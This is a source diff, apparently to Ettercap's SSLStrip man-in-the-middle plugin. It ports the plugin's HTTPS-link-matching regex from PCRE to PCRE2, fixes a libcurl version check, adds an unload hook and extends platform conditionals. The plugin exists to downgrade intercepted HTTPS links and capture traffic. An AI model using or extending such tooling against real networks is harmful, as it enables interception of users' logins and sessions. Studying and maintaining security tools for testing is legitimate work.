@@ -33,8 +33,6 @@
 #include <ec_sleep.h>
 #include <ec_redirect.h>
 
-#include <pcre.h>
-
 #ifndef HAVE_STRNDUP
 #include <missing/strndup.h>
 #endif
@@ -53,7 +51,7 @@
 
 #include <curl/curl.h>
 
-#if (LIBCURL_VERSION_MAJOR < 7) || (LIBCURL_VERSION_MINOR < 26)
+#if (LIBCURL_VERSION_MAJOR < 7) || (LIBCURL_VERSION_MAJOR == 7 && LIBCURL_VERSION_MINOR < 26)
 #error libcurl 7.26.0 or up is needed
 #endif
 
@@ -148,17 +146,23 @@ static pthread_mutex_t list_mutex = PTHREAD_MUTEX_INITIALIZER;
 static int main_fd, main_fd6;
 static struct pollfd poll_fd[2];
 static u_int16 bind_port;
+#ifdef HAVE_PCRE
 static pcre *https_url_pcre;
+#endif
+#ifdef HAVE_PCRE2
+static pcre2_code *https_url_pcre;
+#endif
 static regex_t find_cookie_re;
 
 /* protos */
 int plugin_load(void *);
 static int sslstrip_init(void *);
 static int sslstrip_fini(void *);
+static int sslstrip_unload(void *);
 static void sslstrip(struct packet_object *po);
 static int sslstrip_is_http(struct packet_object *po);
 
-#ifndef OS_LINUX
+#if defined OS_LINUX || defined OS_DARWIN || defined OS_BSD
 static void sslstrip_create_session(struct ec_session **s, struct packet_object *po);
 static int sslstrip_match(void *id_sess, void *id_curr);
 static size_t http_create_ident(void **i, struct packet_object *po);
@@ -205,6 +209,7 @@ struct plugin_ops sslstrip_ops = {
    .version =      "1.2",
    .init =         &sslstrip_init,
    .fini =         &sslstrip_fini,
+   .unload =       &sslstrip_unload,
 };
 
 int plugin_load(void *handle)
@@ -214,8 +219,13 @@ int plugin_load(void *handle)
 
 static int sslstrip_init(void *dummy)
 {
+#ifdef HAVE_PCRE2
+    int error;
+    PCRE2_SIZE erroroffset;
+#else
    const char *error;
    int erroroffset;
+#endif
    int err;
    char errbuf[100];
 
@@ -230,10 +240,21 @@ static int sslstrip_init(void *dummy)
       return PLUGIN_FINISHED;
    }
 
+#ifdef HAVE_PCRE2
+   https_url_pcre = pcre2_compile(URL_PATTERN, PCRE2_ZERO_TERMINATED, PCRE2_MULTILINE|PCRE2_CASELESS, &error, &erroroffset, NULL);
+#else
    https_url_pcre = pcre_compile(URL_PATTERN, PCRE_MULTILINE|PCRE_CASELESS, &error, &erroroffset, NULL);
+#endif
 
    if (!https_url_pcre) {
+#ifdef HAVE_PCRE2
+      PCRE2_UCHAR buffer[256];
+      pcre2_get_error_message(error, buffer, sizeof(buffer));
+      USER_MSG("SSLStrip: plugin load failed: pcre_compile failed (offset: %d), %s\n", erroroffset, buffer);
+#else
       USER_MSG("SSLStrip: plugin load failed: pcre_compile failed (offset: %d), %s\n", erroroffset, error);
+#endif
+
       ec_redirect(EC_REDIR_ACTION_REMOVE, "http", EC_REDIR_PROTO_IPV4,
             NULL, 80, bind_port);
 #ifdef WITH_IPV6
@@ -248,7 +269,12 @@ static int sslstrip_init(void *dummy)
    if (err) {
       regerror(err, &find_cookie_re, errbuf, sizeof(errbuf));
       USER_MSG("SSLStrip: plugin load failed: Could not compile find_cookie regex: %s (%d)\n", errbuf, err);
+#ifdef HAVE_PCRE2
+      pcre2_code_free(https_url_pcre);
+#else
       pcre_free(https_url_pcre);
+#endif
+
       ec_redirect(EC_REDIR_ACTION_REMOVE, "http" , EC_REDIR_PROTO_IPV4,
             NULL, 80, bind_port);
 #ifdef WITH_IPV6
@@ -292,7 +318,11 @@ static int sslstrip_fini(void *dummy)
 
    // Free regexes.
    if (https_url_pcre)
-     pcre_free(https_url_pcre);
+#ifdef HAVE_PCRE2
+      pcre2_code_free(https_url_pcre);
+#else
+      pcre_free(https_url_pcre);
+#endif
 
    regfree(&find_cookie_re);
 
@@ -322,6 +352,14 @@ static int sslstrip_fini(void *dummy)
    return PLUGIN_FINISHED;
 }
 
+static int sslstrip_unload(void *dummy)
+{
+   /* variable not used */
+   (void) dummy;
+
+   return PLUGIN_UNLOADED;
+}
+
 static int sslstrip_is_http(struct packet_object *po)
 {
    /* if already coming from SSLStrip or proto is not TCP */
@@ -338,7 +376,7 @@ static int sslstrip_is_http(struct packet_object *po)
    return 0;
 }
 
-#ifndef OS_LINUX
+#if defined OS_LINUX || defined OS_DARWIN || defined OS_BSD
 static int sslstrip_match(void *id_sess, void *id_curr)
 {
    struct  http_ident *ids = id_sess;
@@ -398,7 +436,7 @@ static void sslstrip(struct packet_object *po)
    if ( (po->flags & PO_FORWARDABLE) &&
         (po->L4.flags & TH_SYN) &&
        !(po->L4.flags & TH_ACK) ) {
-#ifndef OS_LINUX
+#if defined OS_LINUX || defined OS_DARWIN || defined OS_BSD
       struct ec_session *s = NULL;
       sslstrip_create_session(&s, PACKET);   
       memcpy(s->data, &po->L3.dst, sizeof(struct ip_addr));
@@ -648,7 +686,7 @@ static int http_get_peer(struct http_connection *connection)
 }
 
 
-#ifndef OS_LINUX
+#if defined OS_LINUX || defined OS_DARWIN || defined OS_BSD
 static size_t http_create_ident(void **i, struct packet_object *po)
 {
    struct http_ident *ident;
@@ -1087,7 +1125,12 @@ static void http_remove_https(struct http_connection *connection)
    struct https_link *l, *link;
    size_t offset = 0;
    int rc;
+#ifdef HAVE_PCRE2
+   PCRE2_SIZE *ovector;
+   pcre2_match_data *match_data;
+#else
    int ovector[30];
+#endif
    char changed = 0;
    char *new_html, *url;
    size_t new_size = 0;
@@ -1100,7 +1143,17 @@ static void http_remove_https(struct http_connection *connection)
    SAFE_CALLOC(new_html, 1, connection->response->len);
    BUG_IF(new_html==NULL);
 
+#ifdef HAVE_PCRE2
+   match_data = pcre2_match_data_create_from_pattern(https_url_pcre, NULL);
+   while(offset < size && (rc = pcre2_match(https_url_pcre, (PCRE2_SPTR)buf_cpy, size, offset, 0, match_data, NULL)) > 0) {
+#else
    while(offset < size && (rc = pcre_exec(https_url_pcre, NULL, buf_cpy, size, offset, 0, ovector, 30)) > 0) {
+#endif
+
+#ifdef HAVE_PCRE2
+      ovector = pcre2_get_ovector_pointer(match_data);
+#endif
+
       match_start = ovector[0];
       match_end = ovector[1];
 
@@ -1161,6 +1214,9 @@ static void http_remove_https(struct http_connection *connection)
          changed=1;
    }
 
+#ifdef HAVE_PCRE2
+   pcre2_match_data_free(match_data);
+#endif
    
    if (changed) {
       //Copy rest of data (if any)
